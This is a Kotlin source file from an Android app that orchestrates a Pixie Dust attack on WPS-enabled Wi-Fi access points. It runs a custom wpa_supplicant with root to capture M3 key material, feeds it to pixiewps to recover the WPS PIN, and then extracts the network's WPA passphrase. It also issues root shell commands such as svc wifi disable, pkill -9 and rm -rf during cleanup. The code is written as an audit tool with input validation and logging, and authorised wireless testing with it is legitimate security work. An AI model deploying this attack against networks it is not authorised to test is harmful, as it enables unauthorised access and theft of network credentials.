/*
 * AmWF - Android WiFi Monitor Mode Controller
 * Copyright (C) 2026 Hitomatito
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

package com.hitomatito.amwf.wifi.pixiedust

import android.content.Context
import android.net.wifi.WifiManager
import android.util.Log
import com.hitomatito.amwf.R
import com.hitomatito.amwf.ShellExecutor
import java.util.Collections
import kotlinx.coroutines.CoroutineDispatcher
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.ensureActive
import kotlinx.coroutines.isActive
import kotlinx.coroutines.withContext

/**
 * Orquestador del ataque Pixie Dust nativo.
 *
 * Flujo (implementación original de AmWF, GPL-3.0-or-later):
 *   1. Prepara binarios nativos (wpa_supplicant, wpa_cli, pixiewps, libnl) desde assets.
 *   2. Opcionalmente desactiva el WiFi del sistema (svc wifi disable) para liberar la interfaz.
 *   3. Lanza su propio wpa_supplicant con -K -d para volcar las claves WPS
 *      completas por stdout (binario sin CONFIG_ANDROID_LOG; el de Android
 *      las truncaría a 32 bytes en logcat).
 *   4. Espera el socket de control y verifica respuesta PONG vía wpa_cli.
 *   5. Envía wps_reg con un PIN conocido para provocar el intercambio M3.
 *   6. Parsea los 6 campos M3 (E-Nonce, PKE, PKR, AuthKey, E-Hash1, E-Hash2).
 *   7. Ejecuta pixiewps con esos argumentos y recupera el PIN WPS.
 *   8. Opcionalmente obtiene el PSK WPA mediante provisión WPS con el PIN hallado.
 *   9. Limpia procesos y restaura el estado del WiFi en [finally].
 *
 * El trabajo pesado vive en colaboradores: [SupplicantProcesses] (arranque,
 * comandos y parada del supplicant), [PixiewpsExecutor] (ejecución del
 * binario), [PixiePskExtractor] (provisión WPS con el PIN) y
 * [PixieAuditLog] (persistencia del log). Aquí solo queda la secuencia de
 * fases, los reintentos de captura M3 y la limpieza/restauración del WiFi.
 *
 * @param context Contexto de la aplicación.
 * @param ioDispatcher Dispatcher para operaciones de E/S (inyectado para testabilidad).
 */
class PixieDustRunner(
    private val context: Context,
    private val ioDispatcher: CoroutineDispatcher = Dispatchers.IO,
    private val onLog: (String) -> Unit = {},
    private val onStage: (PixieDustStage) -> Unit = {}
) {

    // Validación estricta de BSSID (evita inyección de comandos en shell).
    private val BSSID_REGEX = Regex("^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")
    // Nombre de interfaz alfanumérico simple (evita inyección).
    private val IFACE_REGEX = Regex("^[a-zA-Z0-9]+$")

    // Límites de tiempo y reintentos.
    private val MAX_ATTACK_ROUNDS = 3
    private val M3_CAPTURE_TIMEOUT_MS = 25_000L
    // `svc wifi enable` puede devolver 0 antes de que el framework encienda el
    // radio; se comprueba el estado real y se reintenta.
    private val WIFI_RESTORE_ATTEMPTS = 3
    private val WIFI_RESTORE_RETRY_MS = 1_000L

    private val wifiManager =
        context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager

    private val supplicant = SupplicantProcesses(context)
    private val pixiewps = PixiewpsExecutor(context)
    private val pskExtractor = PixiePskExtractor(context, supplicant)

    /**
     * Mensajes de alto nivel del ataque (decisiones, PIN hallado, PSK, etc.).
     * Las líneas crudas del supplicant/pixiewps se guardan aparte en
     * `rawOutput` para no duplicarlas en el log de auditoría.
     *
     * `log()` puede invocarse desde el hilo lector del supplicant, así que la
     * lista debe ser segura para acceso concurrente.
     */
    private val auditEvents = Collections.synchronizedList(mutableListOf<String>())

    /**
     * true solo si esta ejecución desactivó un WiFi que estaba encendido.
     * Se usa en [cleanup] para no encender el WiFi del usuario si ya estaba
     * apagado antes de empezar.
     */
    @Volatile
    private var wifiDisabledByAttack = false

    /**
     * true cuando [cleanup] ya completó la restauración. [cancel] y el
     * `finally` de [runAttack] pueden llamarlo: la segunda llamada no debe
     * repetir `svc wifi enable` ni volver a registrar "Cleanup done".
     */
    @Volatile
    private var cleanupDone = false

    /**
     * Ejecuta una auditoría Pixie Dust contra el BSSID dado.
     *
     * @param bssid Dirección MAC del objetivo (validada estrictamente).
     * @param interfaceName Nombre de la interfaz WiFi (por defecto "wlan0").
     * @param ssid SSID de la red (opcional, necesario para extraer el PSK).
     * @param freqMHz Frecuencia en MHz (opcional).
     * @param disableWifiBeforeAttack Si true, desactiva el WiFi del sistema antes de atacar.
     * @return [PixieDustResult] con el resultado de la auditoría.
     */
    suspend fun runAttack(
        bssid: String,
        interfaceName: String = "wlan0",
        ssid: String? = null,
        freqMHz: Int? = null,
        disableWifiBeforeAttack: Boolean = true
    ): PixieDustResult = withContext(ioDispatcher) {
        ensureActive()
        auditEvents.clear()
        cleanupDone = false
        stage(PixieDustStage.PREPARING)

        log("[*] ===== PIXIE DUST ATTACK START =====")
        log("[*] BSSID: $bssid | Interface: $interfaceName | SSID: $ssid | freq: ${freqMHz ?: "unknown"}")
        log("[*] Arch suffix: ${NativeBinaries.archSuffix().ifEmpty { "(none)" }}")

        val target = PixieAuditLog.Target(bssid, ssid, freqMHz, interfaceName)
        val rawOutput = StringBuilder()
        // Resultado final para el log de auditoría: `finally` no puede leer
        // las variables locales de cada `return`, así que se conserva aquí.
        var auditResult: PixieDustResult? = null

        // --- Validaciones de entrada (seguridad: evita inyección de comandos) ---
        if (!BSSID_REGEX.matches(bssid)) {
            val failure = PixieDustResult.Failure(
                bssid = bssid,
                reason = context.getString(R.string.pixie_reason_invalid_bssid, bssid),
                rawOutput = ""
            )
            // Salida antes del try principal: se persiste aquí porque el
            // finally no se ejecutará.
            persistAuditLog(failure, target, rawOutput)
            return@withContext failure
        }
        if (!IFACE_REGEX.matches(interfaceName)) {
            val failure = PixieDustResult.Failure(
                bssid = bssid,
                reason = context.getString(R.string.pixie_reason_invalid_interface, interfaceName),
                rawOutput = ""
            )
            persistAuditLog(failure, target, rawOutput)
            return@withContext failure
        }

        // --- Preparar binarios nativos (best-effort: copia los assets a filesDir) ---
        // Debe ejecutarse ANTES de comprobar faltantes: en el primer arranque
        // los binarios empaquetados aún no están copiados.
        // Si esto lanza, no habrá `finally` que persista el log: se captura
        // aquí y se registra igual.
        log("[*] Preparing native binaries...")
        val missing = try {
            NativeBinaries.ensure(context)
            NativeBinaries.missingCriticalBinaries(context)
        } catch (e: Exception) {
            ShellExecutor.logE(TAG, "Error preparando binarios nativos", e)
            val failure = PixieDustResult.Failure(
                bssid = bssid,
                reason = context.getString(
                    R.string.pixie_error_detail,
                    e.message ?: e.javaClass.simpleName
                ),
                rawOutput = ""
            )
            persistAuditLog(failure, target, rawOutput)
            return@withContext failure
        }
        if (missing.isNotEmpty()) {
            log("[-] Missing native assets: ${missing.joinToString(", ")}")
            val failure = PixieDustResult.Failure(
                bssid = bssid,
                reason = NativeBinaries.missingBinariesMessage(context, missing).orEmpty(),
                rawOutput = ""
            )
            persistAuditLog(failure, target, rawOutput)
            return@withContext failure
        }
        log("[+] Native binaries ready")

        var currentSupplicant: SupplicantProcesses.Handle? = null

        try {
            stage(PixieDustStage.DISABLING_WIFI)

            // --- Desactivar WiFi del sistema si se solicita ---
            // Solo se restaura al terminar si estaba encendido antes: nunca se
            // enciende el WiFi del usuario si lo tenía apagado.
            val wifiWasEnabled = wifiManager?.isWifiEnabled == true
            wifiDisabledByAttack = false
            if (disableWifiBeforeAttack && wifiWasEnabled) {
                log("[*] Disabling system WiFi (svc wifi disable)...")
                val wifiOff = execSu("svc wifi disable", timeoutSeconds = 5)
                log("[*] svc wifi disable -> exit=${wifiOff.exitCode}")
                // Se marca aunque el comando falle: si llegó a desactivar la
                // interfaz antes de expirar, cleanup debe intentar restaurarla.
                wifiDisabledByAttack = true
                if (wifiOff.exitCode == 0) {
                    // Si cancelan durante esta espera, el finally exterior
                    // restaura el WiFi y guarda el log de auditoría.
                    delay(2000)
                } else {
                    log("[!] Warning: svc wifi disable returned non-zero; will restore WiFi state anyway")
                }
            } else if (disableWifiBeforeAttack) {
                log("[*] System WiFi already off; skipping svc wifi disable")
            }

            var m3Data: M3Parser.M3Data? = null
            var m5m7: M3Parser.M5M7Capture? = null
            var captureReason: String? = null

            // Intentar capturar el M3 en varias rondas (frescas claves DH cada ronda).
            for (round in 1..MAX_ATTACK_ROUNDS) {
                ensureActive()
                if (round > 1) {
                    log("[*] M3 capture failed in previous round, restarting supplicant for round $round/$MAX_ATTACK_ROUNDS")
                    delay(1000)
                }

                supplicant.stopAndFlush(currentSupplicant, rawOutput, ::log)
                currentSupplicant = null
                stage(PixieDustStage.STARTING_SUPPLICANT)
                val handle = supplicant.launch(
                    iface = interfaceName,
                    rawOutput = rawOutput,
                    log = ::log
                ) ?: run {
                    captureReason = context.getString(R.string.pixie_reason_supplicant_socket)
                    break
                }
                currentSupplicant = handle

                val attempt = captureM3(
                    handle = handle,
                    bssid = bssid,
                    interfaceName = interfaceName,
                    round = round,
                    log = ::log,
                    rawOutput = rawOutput
                )
                m3Data = attempt.data
                m5m7 = attempt.m5m7
                captureReason = attempt.failureReason

                if (m3Data != null) {
                    log("[+] M3 captured (round $round/$MAX_ATTACK_ROUNDS)")
                    // Cierra la sesión WPS en el AP antes de matar el
                    // supplicant: si solo se mata, el AP mantiene la sesión
                    // abierta y la extracción de PSK (que empieza enseguida)
                    // choca con ella.
                    supplicant.cancelWps(interfaceName, ::log)
                    supplicant.stopAndFlush(handle, rawOutput, ::log)
                    currentSupplicant = null
                    break
                }
                if (attempt.terminal) {
                    // El AP abortó la negociación (p. ej. WPS Setup Locked).
                    // Reiniciar el supplicant no cambia el estado del AP, así
                    // que no tiene sentido consumir las rondas restantes.
                    // El motivo se registra una sola vez al salir del bucle.
                    supplicant.stopAndFlush(handle, rawOutput, ::log)
                    currentSupplicant = null
                    break
                }
            }

            if (m3Data == null) {
                val reason = captureReason
                    ?: context.getString(R.string.pixie_reason_no_m3_data)
                log("[-] $reason")
                val failure = PixieDustResult.Failure(
                    bssid = bssid,
                    reason = reason,
                    rawOutput = rawOutput.toString()
                )
                auditResult = failure
                return@withContext failure
            }

            log("[+] M3 captured:")
            log("    E-Nonce: ${m3Data.enrolleeNonce}")
            log("    PKE (peer key): ${m3Data.peerPublicKey}")
            log("    PKR (own key): ${m3Data.ownPublicKey}")
            log("    AuthKey: ${m3Data.authKey}")
            log("    E-Hash1: ${m3Data.eHash1}")
            log("    E-Hash2: ${m3Data.eHash2}")

            val capturedM3 = m3Data
            val capturedM5M7 = m5m7
            if (capturedM5M7 != null && capturedM5M7.hasBoth()) {
                log(
                    "[*] Pixiewps mode 3 (RTL819x): " +
                        "M5=${capturedM5M7.m5Enc?.length ?: 0} hex, " +
                        "M7=${capturedM5M7.m7Enc?.length ?: 0} hex"
                )
            } else {
                log("[*] Pixiewps args: ${capturedM3.toPixiewpsArgs()}")
            }

            // --- Ejecutar pixiewps ---
            stage(PixieDustStage.ANALYZING)
            log("[*] Running pixiewps ...")
            val pixieCmd = pixiewps.buildCommand(capturedM3, capturedM5M7)
            log("[*] Pixiewps command: $pixieCmd")

            val wpsPin = pixiewps.run(pixieCmd, rawOutput, ::log)
            log(if (wpsPin != null) "[+] WPS PIN found: $wpsPin" else "[-] WPS pin not found")

            var wpaPsk: String? = null
            val targetSsid = ssid?.takeIf { it.isNotBlank() }
            if (wpsPin != null && targetSsid != null) {
                stage(PixieDustStage.EXTRACTING_PSK)
                log("[*] Obtaining WPA PSK via WPS provisioning...")
                wpaPsk = pskExtractor.extract(
                    bssid = bssid,
                    iface = interfaceName,
                    ssid = targetSsid,
                    pin = wpsPin,
                    rawOutput = rawOutput,
                    log = ::log
                )
                if (wpaPsk != null) {
                    log("[+] WPA PSK obtained: $wpaPsk")
                } else {
                    log("[-] WPA PSK not obtained")
                }
            } else if (wpsPin != null) {
                log("[*] Skipping PSK extraction (SSID unknown or empty)")
            }

            if (wpsPin != null) {
                val success = PixieDustResult.Success(
                    bssid = bssid,
                    ssid = ssid,
                    wpsPin = wpsPin,
                    wpaPsk = wpaPsk,
                    rawOutput = rawOutput.toString()
                )
                auditResult = success
                return@withContext success
            } else {
                val failure = PixieDustResult.Failure(
                    bssid = bssid,
                    reason = context.getString(R.string.pixie_not_vulnerable),
                    rawOutput = rawOutput.toString()
                )
                auditResult = failure
                return@withContext failure
            }

        } finally {
            try {
                // La cola puede conservar las últimas líneas del supplicant:
                // se vuelcan antes de que cleanup borre el directorio de
                // control y mate los procesos.
                supplicant.stopAndFlush(currentSupplicant, rawOutput, ::log)
            } finally {
                try {
                    cleanup()
                } finally {
                    // Salida sin resultado (normalmente cancelación del
                    // usuario): queda constancia explícita en el log de
                    // auditoría en vez de un "SIN RESULTADO" sin contexto.
                    if (auditResult == null) {
                        log("[!] Ataque interrumpido o cancelado antes de obtener un resultado")
                    }
                    // Incluso si la restauración falla, ningún camino debe
                    // perder el registro. Se ejecuta tras cleanup() para
                    // incluir también sus mensajes cuando sea posible.
                    persistAuditLog(auditResult, target, rawOutput)
                }
            }
        }
    }

    /**
     * Cancela cualquier proceso en curso y restaura el estado del WiFi.
     * Es bloqueante (ejecuta `su`), así que debe llamarse fuera del hilo
     * principal. Es idempotente.
     */
    fun cancel() {
        cleanup()
    }

    // ========================================================================
    // Pasos internos del ataque
    // ========================================================================

    private suspend fun captureM3(
        handle: SupplicantProcesses.Handle,
        bssid: String,
        interfaceName: String,
        round: Int,
        log: (String) -> Unit,
        rawOutput: StringBuilder
    ): M3Attempt = coroutineScope {
        val maxAttempts = 3
        // El motivo final se muestra solo cuando fallan todas las rondas: el
        // total real de intentos es rondas completadas × intentos por ronda.
        val attemptsSoFar = round * maxAttempts
        var lastIncomplete: M3Parser.M3Capture.Incomplete? = null
        var anyRegAccepted = false

        for (attempt in 1..maxAttempts) {
            ensureActive()
            if (attempt > 1) {
                log("[-] M3 incomplete, retrying wps_reg (attempt $attempt/$maxAttempts)...")
                delay(1000)
            }

            // Descartar líneas de la ronda anterior (p. ej. un WPS-FAIL que
            // llegó tarde). Si no se hace, el parser puede consumir ese FAIL
            // antes del M3 de la ronda actual y abortar los reintentos.
            supplicant.discardStale(handle.lines)

            stage(PixieDustStage.REGISTERING_WPS)
            log("[*] Sending wps_reg with PIN $WPS_REG_PIN_DEFAULT...")
            val regResult = supplicant.sendWpsReg(bssid, interfaceName, log)
            rawOutput.append(regResult.output).append("\n")

            if (!isWpsRegAccepted(regResult)) {
                log("[-] wps_reg not accepted (exit=${regResult.exitCode}), retrying...")
                delay(750)
                continue
            }
            anyRegAccepted = true

            stage(PixieDustStage.CAPTURING_M3)
            log("[*] Capturing M3 fields...")
            // M3Parser gestiona su propio timeout; envolverlo en withTimeout
            // podía descartar un M3 completo que llegara justo en el límite.
            val capture = M3Parser.parse(
                lines = handle.lines,
                timeoutMs = M3_CAPTURE_TIMEOUT_MS,
                cancelRequested = { !isActive },
                onLine = { line -> supplicant.recordLine(line, rawOutput, log) },
                onM5M7 = { d ->
                    log("[*] WPS-M5/M7 captured: M5=${d.m5Enc?.length ?: 0} hex, M7=${d.m7Enc?.length ?: 0} hex")
                }
            )

            when (capture) {
                is M3Parser.M3Capture.Complete ->
                    return@coroutineScope M3Attempt(capture.data, null, capture.m5m7)
                is M3Parser.M3Capture.Incomplete -> {
                    lastIncomplete = capture
                    log("[-] M3 capture incomplete: ${capture.capturedCount}/6, missing: ${capture.missing.joinToString()}")
                }
                is M3Parser.M3Capture.Failed -> {
                    // El AP abortó la sesión (p. ej. WPS bloqueado). Reintentar
                    // de inmediato no sirve: el bloqueo no se libera en segundos.
                    // El motivo se registra una sola vez en runAttack.
                    return@coroutineScope M3Attempt(
                        data = null,
                        failureReason = wpsFailureReason(capture.configError),
                        m5m7 = null,
                        terminal = true
                    )
                }
                is M3Parser.M3Capture.Aborted ->
                    // Condición que no cambia al reintentar (PBC-only, AP que
                    // rechaza la asociación): se aborta con el motivo real.
                    return@coroutineScope M3Attempt(
                        data = null,
                        failureReason = context.getString(capture.reasonRes),
                        m5m7 = null,
                        terminal = true
                    )
            }
        }

        val reason = when {
            !anyRegAccepted -> context.getString(R.string.pixie_reason_wps_reg_rejected)
            lastIncomplete != null -> context.getString(
                R.string.pixie_reason_capture_incomplete,
                attemptsSoFar,
                lastIncomplete.capturedCount,
                lastIncomplete.missing.joinToString(", ")
            )
            else -> context.getString(R.string.pixie_reason_capture_failed)
        }
        return@coroutineScope M3Attempt(null, reason, null)
    }

    /** Resuelve el mensaje localizado de un error de configuración WPS. */
    private fun wpsFailureReason(configError: Int?): String {
        val reasonRes = M3Parser.configErrorReasonRes(configError)
        return if (configError == null) {
            context.getString(reasonRes)
        } else {
            context.getString(reasonRes, configError)
        }
    }

    // ========================================================================
    // Utilidades de shell y limpieza
    // ========================================================================

    private fun execSu(command: String, timeoutSeconds: Int): ShellExecutor.Result =
        PixieProcessSupport.execSu(command, timeoutSeconds)

    /**
     * La limpieza puede invocarse a la vez desde [runAttack] (finally) y desde
     * [cancel] (hilo de la UI). Se serializa para que `svc wifi enable` no se
     * ejecute dos veces y para que dos `pkill`/`rm -rf` no se pisen.
     */
    @Synchronized
    private fun cleanup() {
        if (cleanupDone) return
        stage(PixieDustStage.RESTORING)
        try {
            val dir = NativeBinaries.binaryDir(context)
            // Solo los binarios que lanzamos nosotros (cmdline empieza por su
            // ruta); nunca el supplicant del sistema ni el wrapper `su`.
            execSu(
                "pkill -9 -f '^$dir/(wpa_supplicant|wpa_cli|pixiewps)' 2>/dev/null",
                timeoutSeconds = 3
            )
            execSu("rm -rf ${NativeBinaries.ctrlDir()} 2>/dev/null", timeoutSeconds = 3)
        } catch (_: Exception) {}
        if (wifiDisabledByAttack) {
            wifiDisabledByAttack = false
            restoreWifi()
        }
        log("[*] Cleanup done")
        cleanupDone = true
    }

    /**
     * Restaura el WiFi comprobando el estado real del framework. `svc wifi
     * enable` puede devolver 0 sin que el radio llegue a encenderse (visto al
     * cancelar), así que se reintenta hasta confirmarlo. Bloquea a propósito:
     * [cleanup] ya se ejecuta fuera del hilo principal.
     */
    private fun restoreWifi() {
        var lastKnown: Boolean? = null
        repeat(WIFI_RESTORE_ATTEMPTS) { index ->
            val r = execSu("svc wifi enable 2>/dev/null", timeoutSeconds = 5)
            log(
                "[*] Cleanup: svc wifi enable -> exit=${r.exitCode} " +
                    "(intento ${index + 1}/$WIFI_RESTORE_ATTEMPTS)"
            )
            lastKnown = wifiEnabled()
            if (lastKnown == true) return
            if (index < WIFI_RESTORE_ATTEMPTS - 1) Thread.sleep(WIFI_RESTORE_RETRY_MS)
        }
        if (lastKnown == false) {
            log("[!] Cleanup: el WiFi sigue desactivado tras $WIFI_RESTORE_ATTEMPTS intentos")
        } else if (lastKnown == null) {
            log("[!] Cleanup: no se pudo confirmar el estado del WiFi")
        }
    }

    private fun wifiEnabled(): Boolean? {
        val status = execSu(
            "dumpsys wifi 2>/dev/null | grep -m1 -E 'Wi-?Fi is'",
            timeoutSeconds = 5
        )
        return WifiRestore.isEnabled(status.output)
    }

    private fun log(message: String) {
        // No usar ShellExecutor.logD aquí: este log incluye claves M3, PIN/PSK
        // y salida cruda del supplicant, y AppLogger se exporta en diagnósticos.
        Log.d(TAG, message)
        auditEvents.add(message)
        onLog(message)
    }

    /** Notifica un hito de progreso a la UI; nunca debe romper la auditoría. */
    private fun stage(value: PixieDustStage) {
        try {
            onStage(value)
        } catch (e: Exception) {
            ShellExecutor.logW(TAG, "Stage callback failed: $value (${e.message})")
        }
    }

    /**
     * Guarda el log de auditoría con el estado actual. Se usa tanto en las
     * salidas tempranas como en el `finally` de [runAttack] para que ningún
     * camino pierda el registro.
     */
    private fun persistAuditLog(
        result: PixieDustResult?,
        target: PixieAuditLog.Target,
        rawOutput: StringBuilder
    ) {
        try {
            // `Collections.synchronizedList` exige sincronizar la iteración:
            // el hilo lector del supplicant aún podría estar añadiendo líneas.
            val events = synchronized(auditEvents) { auditEvents.toList() }
                .filterNot {
                    it.startsWith("[supplicant]") ||
                        it.startsWith("[pixiewps-stderr]")
                }
            PixieAuditLog.persist(
                context = context,
                result = result,
                target = target,
                eventLines = events,
                rawLines = rawOutput.toString().lines(),
                log = ::log
            )
        } catch (e: Exception) {
            ShellExecutor.logE(TAG, "Error saving audit log", e)
        }
    }

    // ========================================================================
    // Clases de soporte internas
    // ========================================================================

    private data class M3Attempt(
        val data: M3Parser.M3Data?,
        val failureReason: String?,
        val m5m7: M3Parser.M5M7Capture?,
        /** true si el AP terminó la negociación y no tiene sentido reintentar. */
        val terminal: Boolean = false
    )

    companion object {
        private const val TAG = "PixieDustRunner"
    }
}
